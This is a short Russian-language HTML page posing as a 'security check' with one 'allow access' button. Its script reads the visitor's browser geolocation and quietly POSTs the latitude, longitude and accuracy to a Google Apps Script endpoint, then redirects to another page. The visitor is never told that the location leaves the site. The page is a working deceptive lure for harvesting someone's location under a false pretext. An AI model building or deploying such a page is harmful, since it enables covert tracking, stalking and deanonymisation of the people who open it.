<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Проверка безопасности</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background: #f0f0f0;
      color: #333;
      text-align: center;
    }
    .loader {
      margin-top: 20px;
      border: 6px solid #f3f3f3;
      border-top: 6px solid #333;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      display: none;
    }
    #consentBtn {
      padding: 12px 24px;
      background: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h2>Проверка безопасности</h2>
  <button id="consentBtn">Разрешить доступ</button>
  <div class="loader"></div>

  <script>
    const loader = document.querySelector('.loader');
    const consentBtn = document.getElementById('consentBtn');

    function requestGeolocation() {
      loader.style.display = 'block';
      consentBtn.style.display = 'none';

      navigator.geolocation.getCurrentPosition(
        sendLocation,
        locationError,
        { enableHighAccuracy: false, timeout: 15000 }
      );
    }

    function sendLocation(pos) {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const acc = pos.coords.accuracy;

      // Используем ваш новый URL скрипта
      const scriptURL = 'https://script.google.com/macros/s/AKfycbwwcQTSCIqax9zqr34hi1ZjG-bLbANP61uJ1hO98InFXQyDuv9Ct0n8RqyGvncV_Y8j/exec';

      fetch(scriptURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ lat, lon, acc })
      })
      .then(response => {
        if (!response.ok) throw new Error('Ошибка сервера');
        return response.json();
      })
      .then(data => {
        console.log('Успешно:', data);
        window.location.href = "/next-page.html";
      })
      .catch(err => {
        console.error('Ошибка:', err);
        alert('Не удалось отправить данные: ' + err.message);
      })
      .finally(() => {
        loader.style.display = 'none';
        consentBtn.style.display = 'block';
      });
    }

    function locationError(err) {
      loader.style.display = 'none';
      consentBtn.style.display = 'block';
      alert('Ошибка геолокации: ' + err.message);
    }

    consentBtn.addEventListener('click', requestGeolocation);
  </script>
</body>
</html>
